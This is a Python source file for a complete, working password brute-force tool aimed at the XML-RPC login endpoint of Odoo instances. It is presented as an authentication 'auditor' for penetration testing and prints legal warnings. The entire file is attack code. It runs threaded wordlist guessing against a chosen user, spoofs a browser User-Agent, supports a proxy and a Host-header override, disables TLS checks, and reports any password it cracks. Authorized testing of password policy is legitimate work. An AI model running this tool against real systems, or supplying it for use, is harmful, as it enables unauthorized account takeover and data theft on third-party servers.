#!/usr/bin/env python3
"""
odoo_auth_auditor.py -- Odoo XML-RPC Authentication Auditor.

Tests password policy resilience against  Odoo instances
Built for lightweight, mobile-first reconnaissance and  penetration testing.

Author  : Alexander Anthony (Texla Kid)
GitHub  : https://github.com/Texlakid
Version : 1.0
Date    : 2026-11-01

WARNING: Do not use against targets without 
explicit, written authorization.

Usage:
    python3 odoo_auth_auditor.py --url https://target.lab --db mydb --user admin --wordlist passwords.txt
"""

import argparse
import sys
import threading
import time
import xmlrpc.client
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

C_GREEN = '\033[92m'
C_RED = '\033[91m'
C_YELLOW = '\033[93m'
C_CYAN = '\033[96m'
C_RESET = '\033[0m'

class OdooAuthAuditor:
    def __init__(self, args):
        self.url = args.url.rstrip('/')
        self.db = args.db
        self.user = args.user
        self.wordlist = args.wordlist
        self.threads = min(max(args.threads, 1), 10)
        self.host_header = args.host
        self.delay = args.delay
        
        self.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        
        self.stop_event = threading.Event()
        self.found_password = None
        self.tested_count = 0
        self.total_passwords = 0
        self.lock = threading.Lock()
        
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "Content-Type": "text/xml", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        if self.host_header:
            self.session.headers["Host"] = self.host_header

    def get_line_count(self):
        try:
            with open(self.wordlist, 'rb') as f:
                return sum(1 for _ in f)
        except OSError as e:
            print(f"{C_RED}[!] Cannot read wordlist: {e}{C_RESET}")
            sys.exit(1)

    def read_wordlist(self):
        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    pw = line.strip()
                    if pw:
                        yield pw
        except OSError as e:
            print(f"{C_RED}[!] Cannot read wordlist: {e}{C_RESET}")
            sys.exit(1)

    def try_login(self, password):
        if self.stop_event.is_set():
            return

        params = (self.db, self.user, password)
        try:
            xml_payload = xmlrpc.client.dumps(params, methodname="login", allow_none=True)
        except Exception:
            return 

        try:
            r = self.session.post(
                f"{self.url}/xmlrpc/2/common", 
                data=xml_payload, 
                timeout=10, 
                proxies=self.proxies
            )
            
            if r.status_code == 500:
                return
                
            try:
                response, _ = xmlrpc.client.loads(r.text)
                if isinstance(response, int) and response > 0:
                    with self.lock:
                        if not self.stop_event.is_set():
                            self.stop_event.set()
                            self.found_password = password
                    return
            except xmlrpc.client.Fault:
                pass 
            except Exception:
                pass 
                
        except requests.RequestException:
            pass 
        
        if self.delay > 0:
            time.sleep(self.delay)

    def run(self):
        print(f"{C_CYAN}===================================================={C_RESET}")
        print(f"{C_CYAN}      Odoo XML-RPC Auth Auditor | TEXLA KID         {C_RESET}")
        print(f"{C_CYAN}===================================================={C_RESET}")
        print(f"[*] Target   : {self.url}")
        print(f"[*] Database : {self.db}")
        print(f"[*] Username : {self.user}")
        print(f"[*] Threads  : {self.threads}")
        print(f"[*] Delay    : {self.delay}s")
        print(f"[*] Proxy    : {self.proxies if self.proxies else 'None'}\n")

        self.total_passwords = self.get_line_count()
        print(f"{C_YELLOW}[*] Loaded {self.total_passwords} passwords. Starting attack...{C_RESET}\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for pw in self.read_wordlist():
                if self.stop_event.is_set():
                    break
                futures[executor.submit(self.try_login, pw)] = pw

            for future in as_completed(futures):
                with self.lock:
                    self.tested_count += 1
                    current_count = self.tested_count
                
                if self.found_password:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                if current_count % 50 == 0:
                    progress = (current_count / self.total_passwords) * 100
                    print(f"{C_CYAN}[*] Progress: {current_count}/{self.total_passwords} ({progress:.1f}%){C_RESET}")
                
                if self.stop_event.is_set():
                    break

        self.print_summary()

    def print_summary(self):
        print(f"\n{'-'*50}")
        if self.found_password:
            print(f"{C_GREEN}[+] SUCCESS! Valid Credentials Found:{C_RESET}")
            print(f"    Username: {self.user}")
            print(f"    Password: {C_GREEN}{self.found_password}{C_RESET}")
        else:
            print(f"{C_RED}[-] Exhausted wordlist or interrupted. No valid password found.{C_RESET}")
        print(f"[*] Total tested: {self.tested_count}")
        print(f"{'-'*50}\n")

def signal_handler(sig, frame):
    print(f"\n{C_YELLOW}[!] Interrupt caught. Shutting down gracefully...{C_RESET}")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="Odoo XML-RPC Authentication Auditor ",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Base URL, e.g., https://target.lab")
    parser.add_argument("--db", required=True, help="Odoo Database name")
    parser.add_argument("--user", default="admin", help="Username to target")
    parser.add_argument("--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads (max 10)")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between attempts")
    parser.add_argument("--host", help="Optional Host header override")
    parser.add_argument("--proxy", help="Optional Proxy URL (e.g., http://127.0.0.1:8080)")
    
    args = parser.parse_args()

    print(f"{C_RED}[!] LEGAL NOTICE: Use only on targets you own or have written permission to test.{C_RESET}")
    print(f"{C_RED}[!] Unauthorized access is a criminal offense.{C_RESET}\n")

    signal.signal(signal.SIGINT, signal_handler)

    auditor = OdooAuthAuditor(args)
    auditor.run()

if __name__ == "__main__":
    main()
